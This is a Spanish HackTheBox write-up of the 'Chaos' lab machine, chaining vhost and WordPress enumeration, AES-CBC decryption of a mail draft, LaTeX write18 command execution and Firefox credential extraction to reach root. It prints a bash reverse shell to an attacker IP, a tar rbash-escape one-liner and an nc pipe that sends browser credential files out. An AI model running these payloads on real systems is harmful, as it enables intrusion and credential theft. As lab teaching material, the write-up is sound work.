---
layout: post
render_with_liquid: false
title: "HTB Writeup: Chaos"
date: 2026-04-30
category: writeups
tags: [htb, linux, medium, wordpress, vhost, imap, roundcube, aes-cbc, latex-injection, write18, restricted-shell, gtfobins, tar, firefox, firefox_decrypt, webmin]
platform: HackTheBox
os: Linux
difficulty: Medium
has_exploits: false
resumen: "Cadena web sobre virtual hosts en chaos.htb que combina enumeración de WordPress, un post protegido por contraseña que filtra credenciales de IMAP, un borrador en Drafts con un mensaje cifrado en AES-CBC y su propio script de cifrado, una URL oculta tras doble base64 que expone un servicio LaTeX vulnerable a write18, RCE como www-data, escape de rbash con tar (--checkpoint-action) y privesc final extrayendo el master password de un perfil de Firefox con firefox_decrypt para reutilizarlo contra root y Webmin."
permalink: /writeups/chaos/
---

| Propiedad  | Valor      |
| :--------- | :--------- |
| Plataforma | HackTheBox |
| OS         | Linux      |
| Dificultad | Medium     |
| Autor      | Ghostvyle  |

## Sinopsis

**Chaos** es una máquina Linux clásica de HackTheBox cuyo recorrido encadena enumeración web sobre **virtual hosts**, un **WordPress con post protegido por contraseña** que filtra credenciales de correo, un **borrador en IMAP** con un mensaje cifrado en **AES-CBC** y su propio script de cifrado, una URL oculta tras **doble codificación (cifrado AES + base64)** que expone un servicio LaTeX vulnerable a **`write18` (command execution)**, escape de **`rbash`** mediante `tar --checkpoint-action` y escalada a root extrayendo credenciales del **perfil de Firefox** del usuario con `firefox_decrypt`.

La intrusión inicial parte de un **`Direct IP not allowed`** que obliga a trabajar por nombre. Tras añadir `chaos.htb`, `wordpress.chaos.htb` y `webmail.chaos.htb` al `/etc/hosts` (los dos últimos descubiertos por **`gobuster vhost`**), `wpscan` identifica al usuario `human` y un único post protegido cuya contraseña es **`human`** — el propio nombre del usuario. El post filtra `ayush:jiujitsu`, credenciales válidas en **Roundcube/IMAPS** sobre `webmail.chaos.htb`. Conectando por IMAP encontramos en `Drafts` un borrador con dos adjuntos: `enim_msg.txt` (mensaje cifrado) y `en.py` (script que cifra con **AES-256-CBC** derivando la key con `SHA256(password)`). El propio mensaje en plano nos da la pista de la password: `sahay`. Tras descifrar y decodificar el `base64` resultante aparece la URL **`http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/`**, un *PDF maker* en LaTeX que pretende estar "on hold" pero ejecuta el backend igualmente. Construimos un payload con **`\immediate\write18{...}`** y la técnica de *read-back* (`\openin\file=/tmp/out` + `\typeout{CMDOUTPUT:\lineA}`) para confirmar RCE devolviendo el `id` en el log de `pdfTeX`, y disparamos una reverse shell como **`www-data`**.

Desde `www-data` reutilizamos `jiujitsu` para `su ayush`, que tiene **`rbash`** restringido a tres binarios (`dir`, `ping`, `tar`). El escape clásico de **GTFOBins** con `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` nos rompe la jaula. El último escalón está en `~/.mozilla/firefox/bzo7sjt1.default18`: descargamos el perfil con `nc`, lo procesamos con **`firefox_decrypt`** usando como master password la propia `jiujitsu` y obtenemos credenciales de **`root`** guardadas para **Webmin** (`https://chaos.htb:10000`). La misma password sirve directamente para `su root`.

---

## Reconocimiento

### Escaneo de puertos

Lanzamos un escaneo SYN completo sobre los 65535 puertos TCP:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.36.85 -oG allPorts
```

| Parámetro         | Descripción                                              |
| :---------------- | :------------------------------------------------------- |
| `-p-`             | Escanea los 65535 puertos TCP                            |
| `--open`          | Muestra únicamente los puertos abiertos                  |
| `-sS`             | SYN Scan (half-open, más rápido y sigiloso)              |
| `--min-rate 5000` | Envía mínimo 5000 paquetes por segundo                   |
| `-vvv`            | Máxima verbosidad durante el escaneo                     |
| `-n`              | Desactiva la resolución DNS                              |
| `-Pn`             | No realiza descubrimiento de host (asume que está activo)|
| `-oG allPorts`    | Exporta los resultados en formato grepeable              |

![nmap full ports — 80, 110, 143, 993, 995 y 10000 abiertos en chaos](/writeups/chaos/assets/01_nmap_full_ports.png)

Resultado:

| Puerto      | Servicio         |
| :---------- | :--------------- |
| `80/tcp`    | HTTP             |
| `110/tcp`   | POP3             |
| `143/tcp`   | IMAP             |
| `993/tcp`   | IMAPS            |
| `995/tcp`   | POP3S            |
| `10000/tcp` | Webmin / MiniServ|

La superficie pinta a **mail server + WordPress + panel administrativo**. Con esos seis puertos ya intuimos parte del camino.

### Detección de versiones

```bash
sudo nmap -sCV -p80,110,143,993,995,10000 10.129.36.85 -oN targeted
```

![nmap -sCV identificando Apache 2.4.34, Dovecot pop3/imap y Webmin](/writeups/chaos/assets/02_nmap_versions.png)

Lo relevante:

- **80/tcp** — Apache httpd 2.4.34 (Ubuntu)
- **110/995** — Dovecot pop3d
- **143/993** — Dovecot imapd, certificado para `chaos.htb` y `mail1.chaos.htb`
- **10000/tcp** — MiniServ 1.910 (Webmin)

El certificado SSL de los puertos IMAP/POP confirma que existe un dominio `chaos.htb` y un host `mail1.chaos.htb`.

### `Direct IP not allowed`

Visitando `http://10.129.36.85/` directamente:

![Página devuelve "Direct IP not allowed" en rojo](/writeups/chaos/assets/03_direct_ip_not_allowed.png)

El servidor está configurado para **rechazar peticiones por IP**: solo responde cuando el `Host` coincide con un *virtual host* válido. Esto confirma que tenemos que trabajar por nombre. Añadimos al `/etc/hosts` los tres dominios que iremos descubriendo:

```text
10.129.36.85 chaos.htb wordpress.chaos.htb webmail.chaos.htb
```

![/etc/hosts con chaos.htb y subdominios añadidos](/writeups/chaos/assets/04_etc_hosts.png)

Con `chaos.htb` ya carga la web principal:

![Landing principal — "Here at Chaos We shield"](/writeups/chaos/assets/05_chaos_htb_home.png)

Confirmamos el stack con `whatweb`:

```bash
whatweb chaos.htb:80
```

![whatweb chaos.htb — Apache 2.4.34, Bootstrap, jQuery 3.2.1, Title Chaos](/writeups/chaos/assets/06_whatweb_chaos.png)

`Apache/2.4.34 (Ubuntu)`, **Bootstrap**, **jQuery 3.2.1** y un email de contacto `info@chaos.htb`. El front es estático: el contenido vivo no está aquí.

---

## Enumeración web

### Gobuster sobre la IP

A pesar del `Direct IP not allowed` de la home, `gobuster` por IP devuelve resultados porque algunos directorios responden sin filtrar el `Host`:

```bash
gobuster dir -u http://10.129.36.85/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50
```

![gobuster sobre la IP — encuentra /wp con Status 301](/writeups/chaos/assets/07_gobuster_ip.png)

El hit interesante es **`/wp`**, que cae en *directory listing*:

![Index of /wp — subdirectorio wordpress/](/writeups/chaos/assets/08_wp_index.png)

`Apache/2.4.34 (Ubuntu) Server at 10.129.36.85 Port 80` — el directorio `/wp/` lista un único subdirectorio `wordpress/`, lo que sugiere que **el WordPress real no se sirve aquí**, sino en su propio vhost. Lo dejamos anotado y pasamos a enumerar subdominios.

### Enumeración de virtual hosts

```bash
sudo gobuster vhost -u http://chaos.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 50
```

![gobuster vhost — webmail.chaos.htb (200, 5607) y wordpress.chaos.htb (200, 53511)](/writeups/chaos/assets/09_gobuster_vhost.png)

Aparecen dos vhosts útiles:

| Vhost                 | Servicio  |
| :-------------------- | :-------- |
| `wordpress.chaos.htb` | WordPress |
| `webmail.chaos.htb`   | Roundcube |

### `wordpress.chaos.htb` — fuzzing de rutas

```bash
gobuster dir -u http://wordpress.chaos.htb/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50
```

![gobuster en wordpress.chaos.htb — wp-content, wp-includes, wp-login, wp-admin](/writeups/chaos/assets/10_gobuster_wordpress.png)

Estructura típica de WordPress: `wp-content`, `wp-includes`, `wp-admin`. Visitando el vhost en el navegador aparece un único post **"Protected: chaos"**:

![wordpress.chaos.htb — Protected: chaos, formulario de password](/writeups/chaos/assets/11_wordpress_vhost.png)

El contenido está bloqueado tras un formulario de contraseña. WordPress usa este mecanismo a nivel de post (no a nivel de WP-Admin), así que aquí no nos sirve el clásico `wp-login.php` brute force — necesitamos descubrir el password del propio post.

---

## WordPress — `human:human`

### `wpscan`

Lanzamos un primer escaneo amplio:

```bash
wpscan --url http://wordpress.chaos.htb -e u,vp,vt,cb,dbe --api-token <TOKEN>
```

![WPScan banner — WordPress Security Scanner v3.8.28](/writeups/chaos/assets/12_wpscan_banner.png)

WPScan detecta **65 vulnerabilidades agregadas** en el WordPress y sus dependencias, pero ninguna sirve sin autenticación previa. Lo realmente útil del escaneo es la **enumeración de usuarios**:

![WPScan — User identificado: human (Author Posts + RSS Generator + WP JSON API)](/writeups/chaos/assets/13_wpscan_users.png)

```text
[+] human
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |  - http://wordpress.chaos.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
```

El único usuario es **`human`**.

### El post protegido

Desde el front del post protegido:

![Formulario "Protected: chaos" pidiendo password](/writeups/chaos/assets/14_wp_protected_form.png)

Probamos como password el propio nombre de usuario, **`human`**, y entra. El contenido del post es directo:

![Post desbloqueado — Creds for webmail: ayush / jiujitsu](/writeups/chaos/assets/16_creds_revealed.png)

```text
Creds for webmail :
username – ayush
password – jiujitsu
```

---

## Webmail — IMAP / Roundcube

### Reconocimiento de Roundcube

`webmail.chaos.htb` expone Roundcube. La primera comprobación obligada es el instalador:

![Roundcube — "The installer is disabled!"](/writeups/chaos/assets/17_roundcube_installer.png)

```text
http://webmail.chaos.htb/installer/?_step=1
```

El instalador está deshabilitado, así que no podemos abusar del setup. Probamos con las credenciales obtenidas:

![Roundcube logueado como ayush@localhost — Inbox vacío](/writeups/chaos/assets/18_roundcube_login.png)

`ayush:jiujitsu` funciona. El **Inbox está vacío**, la clave es revisar **el resto de carpetas**, especialmente `Drafts`.

### El borrador con adjuntos

En Roundcube ya se ve el borrador completo:

![Drafts — borrador "service" con adjuntos enim_msg.txt y en.py](/writeups/chaos/assets/19_imap_drafts.png)

```text
From: ayush@localhost
To:   ayush <ayush@localhost>
Date: 2018-10-28 13:16

Hii, sahay
Check the enmsg.txt
You are the password XD.
Also attached the script which i used to encrypt.
Thanks,
Ayush

Attachments:
 - enim_msg.txt (~272 B)
 - en.py        (~804 B)
```

Tres datos críticos en este mensaje:

1. El destinatario "real" es **`sahay`**.
2. Hay un **mensaje cifrado** (`enim_msg.txt`).
3. Hay un **script de cifrado** (`en.py`).
4. Y la frase clave: **"You are the password XD"** — la propia palabra `sahay` es la password de cifrado.

---

## Descifrado del borrador — AES-256-CBC

### El script `en.py`

Descargamos los dos adjuntos y revisamos el cifrador:

![en.py — encrypt() con AES MODE_CBC + chunksize 64*1024](/writeups/chaos/assets/20_enpy_script.png)

```python
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
import os

def getKey(password):
    hasher = SHA256.new(password.encode("utf-8"))
    return hasher.digest()

def encrypt(key, filename):
    chunksize = 64 * 1024
    outputFile = "en" + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV = Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, "rb") as infile:
        with open(outputFile, "wb") as outfile:
            outfile.write(filesize.encode("utf-8"))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b" " * (16 - (len(chunk) % 16))
                outfile.write(encryptor.encrypt(chunk))
```

Tres puntos importantes para escribir el descifrador:

| Detalle                                      | Implicación                                                                  |
| :------------------------------------------- | :--------------------------------------------------------------------------- |
| `getKey()` = `SHA256(password)`              | La key son **32 bytes** → AES-256                                            |
| `MODE_CBC` con `IV = Random.new().read(16)`  | Cada cifrado tiene un IV nuevo de 16 bytes, **prepended** al fichero         |
| `filesize = str(...).zfill(16)`              | Los **primeros 16 bytes del fichero** son el tamaño original como ASCII      |
| Padding con `b" "` hasta múltiplo de 16      | El descifrador tiene que truncar al `filesize` real para limpiar el padding  |

La estructura de `enim_msg.txt` queda:

```
[ 16 bytes filesize ASCII ][ 16 bytes IV ][ ciphertext padded ]
```

### Descifrado

Reescribimos la función `decrypt()` simétrica, leyendo en el mismo orden:

```python
import os
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

def getKey(password):
    return SHA256.new(password.encode("utf-8")).digest()

def decrypt(key, filename):
    chunksize = 64 * 1024
    outputFile = "de" + filename[2:] if filename.startswith("en") else "de" + filename

    with open(filename, "rb") as infile:
        filesize = int(infile.read(16))
        IV = infile.read(16)

        decryptor = AES.new(key, AES.MODE_CBC, IV)

        with open(outputFile, "wb") as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(filesize)

    print(f"Archivo descifrado creado: {outputFile}")

if __name__ == "__main__":
    password = input("Password: ")
    filename = input("Archivo cifrado: ")

    key = getKey(password)
    decrypt(key, filename)
```

Lo ejecutamos con `sahay` como password:

![python3 decrypt.py — produce deim_msg.txt con base64](/writeups/chaos/assets/21_decrypt_run.png)

```text
$ python3 decrypt.py
Password: sahay
Archivo cifrado: enim_msg.txt
Archivo descifrado creado: deim_msg.txt
```

El contenido descifrado es **base64**, no texto plano. La doble capa (AES + base64) está pensada para esconder la URL final.

### Decodificación final

```bash
echo "SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sg..." | base64 -d
```

![base64 -d revelando el mensaje en claro con la URL](/writeups/chaos/assets/22_base64_decode.png)

```text
Hii Sahay

Please check our new service which create pdf

p.s - As you told me to encrypt important msg, i did :)

http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3

Thanks,
Ayush
```

Nueva URL oculta: **`http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/`**, un servicio interno de generación de PDF. La ruta tiene aspecto de *security through obscurity* — no es alcanzable desde gobuster con wordlists comunes, y precisamente por eso hace falta el camino IMAP→cifrado→base64 para descubrirla.

---

## Foothold — LaTeX `write18` RCE

### El "PDF maker"

La página recibe un texto, deja elegir un *template* y genera un PDF:

![Test — "This service is on hold" + textarea + selector test1/test2 + Create PDF](/writeups/chaos/assets/23_service_on_hold.png)

```text
This service is on hold
Chaos Inc soon gonna launch this service. We are working on it
and currently only one template is working.
```

Aunque la interfaz dice que "está en pausa", **el backend procesa la petición igual**. El backend es **`pdfTeX`**, lo que delata el `Transcript` del log que devuelve cuando algo falla — y con `pdfTeX` viene la clásica vulnerabilidad de **`\write18`** cuando el binario se compila o se invoca con `--shell-escape` / `shell_escape_commands` activado.

### `\write18` + read-back para exfiltrar output

El payload mínimo sería `\immediate\write18{id}`, pero `pdfTeX` ejecuta el comando **fuera del flujo del PDF** y la salida no aparece en el documento. Para confirmar la RCE necesitamos *leer de vuelta* el resultado dentro del propio `tex` y forzarlo al log:

```latex
\immediate\write18{id > /tmp/out}
\newread\file
\openin\file=/tmp/out
\read\file to\lineA
\typeout{CMDOUTPUT:\lineA}
```

Capturamos la respuesta del backend con Burp:

![Burp — POST /ajax.php con CMDOUTPUT:uid=33(www-data) gid=33(www-data) groups=33(www-data) en el transcript de pdfTeX](/writeups/chaos/assets/24_latex_id.png)

```text
CMDOUTPUT:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

| Primitivas LaTeX usadas        | Función                                                              |
| :----------------------------- | :------------------------------------------------------------------- |
| `\immediate\write18{cmd}`      | Ejecuta `cmd` en una shell del sistema (cuando `--shell-escape` ON)  |
| `\newread\file`                | Reserva un *file handle* para lectura                                |
| `\openin\file=/tmp/out`        | Abre el fichero recién escrito                                       |
| `\read\file to\lineA`          | Lee la primera línea en la macro `\lineA`                            |
| `\typeout{CMDOUTPUT:\lineA}`   | Vuelca `\lineA` al *transcript* (`.log`) y a la respuesta HTTP       |

### Reverse shell

Ya con RCE confirmada, mutamos el payload a una *bash reverse shell*:

```latex
\immediate\write18{bash -c 'bash -i >& /dev/tcp/10.10.15.178/7777 0>&1' > /tmp/out}
\newread\file
\openin\file=/tmp/out
\read\file to\lineA
\typeout{CMDOUTPUT:\lineA}
```

![Textarea con la reverse shell + template test2 + Create PDF](/writeups/chaos/assets/25_latex_revshell.png)

Listener:

```bash
nc -lvnp 7777
```

![nc recibiendo la conexión — www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$](/writeups/chaos/assets/26_revshell_received.png)

```text
Connection received on 10.129.36.85 42448
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$
```

Shell como **`www-data`**, en el directorio temporal donde `pdfTeX` compila.

---

## Movimiento lateral — `www-data` → `ayush` (rbash)

### Escalada por reutilización de password

Estabilizamos el TTY y comprobamos los usuarios humanos del sistema:

```bash
ls /home
# ayush  sahay

su ayush
# Password: jiujitsu
```

![su ayush con password jiujitsu — sesión como ayush@chaos](/writeups/chaos/assets/27_su_ayush.png)

La password del webmail (`jiujitsu`) **funciona también para `ayush` en el sistema**. La reutilización entre el correo y la cuenta local es el primer pivote real.

### `rbash` — escape con `tar`

`ayush` no tiene una bash normal — está corriendo **`rbash`** con `PATH` apuntando a `/home/ayush/.app/`, donde solo hay tres binarios permitidos:

```bash
ayush@chaos:/opt$ ls
rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names

ayush@chaos:/opt$ echo /home/ayush/.app/*
/home/ayush/.app/dir /home/ayush/.app/ping /home/ayush/.app/tar
```

![Sesión rbash mostrando las restricciones y los binarios disponibles](/writeups/chaos/assets/28_tar_escape.png)

| Binario | Útil para                                              |
| :------ | :----------------------------------------------------- |
| `dir`   | Listar (suplente de `ls` permitido en la jaula)         |
| `ping`  | ICMP — irrelevante para escape                          |
| `tar`   | **Escape directo** vía `--checkpoint-action`            |

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

| Flag                                  | Función                                                              |
| :------------------------------------ | :------------------------------------------------------------------- |
| `-cf /dev/null`                       | Crea un archivo en `/dev/null` (descarta la salida)                  |
| `/dev/null`                           | Único miembro del archivo (placeholder)                              |
| `--checkpoint=1`                      | Activa los checkpoints cada 1 registro                               |
| `--checkpoint-action=exec=/bin/sh`    | Ejecuta `/bin/sh` en cada checkpoint                                 |

Tras el escape, la sesión queda en una `/bin/sh` minimal. Restauramos el `PATH` para tener todas las utilidades:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

```bash
$ ls /home/ayush
mail  user.txt
$ cat /home/ayush/user.txt
feb072afae59eb179a9489e86f7183af
```

**Flag de usuario** en `/home/ayush/user.txt`.

---

## Privilege Escalation — Firefox profile → root

### El perfil de Firefox

Inspeccionando el home de `ayush` aparece un perfil de Firefox completo:

```bash
find /home/ayush -name '*.default*' 2>/dev/null
# /home/ayush/.mozilla/firefox/bzo7sjt1.default18
```

Los perfiles de Firefox guardan las credenciales de los formularios web en:

| Fichero        | Contenido                                                                                  |
| :------------- | :----------------------------------------------------------------------------------------- |
| `logins.json`  | Pares `(URL, usuario, password cifrada)` en JSON                                           |
| `key4.db`      | Base de datos NSS con la **master key** cifrada por una *master password* (PBKDF2 + 3DES)  |
| `cert9.db`     | Certificados (necesario para que `firefox_decrypt` no falle inicializando NSS)             |

Para descifrarlo necesitamos los tres ficheros en local. Subimos un listener `nc` en el atacante y empaquetamos por la víctima:

```bash
# Atacante
nc -lvnp 9001 > firefox_profile.tar
```

```bash
# Víctima (ayush)
cd /home/ayush/.mozilla/firefox/bzo7sjt1.default18
tar -cf - logins.json key4.db cert9.db | nc 10.10.15.178 9001
```

![nc transferencia recibida (~1769 B) + listado del perfil de Firefox](/writeups/chaos/assets/29_firefox_tar.png)

### `firefox_decrypt`

`firefox_decrypt` (de `unode/firefox_decrypt`) automatiza la cadena: lee `key4.db`, pide la *master password*, deriva la master key con NSS y descifra cada entrada de `logins.json`.

```bash
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt
mkdir -p firefox_profile/bzo7sjt1.default18
tar -xf ../firefox_profile.tar -C firefox_profile/bzo7sjt1.default18
python3 firefox_decrypt.py firefox_profile/
```

![firefox_decrypt pidiendo Master Password (jiujitsu) y revelando las credenciales](/writeups/chaos/assets/30_firefox_decrypt.png)

La *master password* del navegador es de nuevo **`jiujitsu`** — la misma que usamos en webmail, en `su ayush` y ahora aquí. La password de `ayush` se está reutilizando para todo, y al desbloquear el almacén Firefox suelta una credencial guardada para el panel **Webmin**:

```text
Website:  https://chaos.htb:10000
Username: root
Password: <password de Webmin>
```

### Acceso como root

Esa misma password sirve directamente para `su root` desde la sesión actual:

```bash
ayush@chaos:~/.mozilla/firefox/bzo7sjt1.default18$ su root
Password:
root@chaos:/home/ayush# cd
root@chaos:~# cat root.txt
12e6ab1cc7527d872a492b245ed6f9d9
```

![su root + cat /root/root.txt](/writeups/chaos/assets/31_su_root.png)

**Flag de root** en `/root/root.txt`.

---

> **Disclaimer**: Este contenido es exclusivamente para investigación y formación en ciberseguridad. Solo debe aplicarse en entornos autorizados y controlados como los laboratorios de HackTheBox, TryHackMe o entornos propios. El uso de estas técnicas contra infraestructura sin permiso explícito es ilegal.
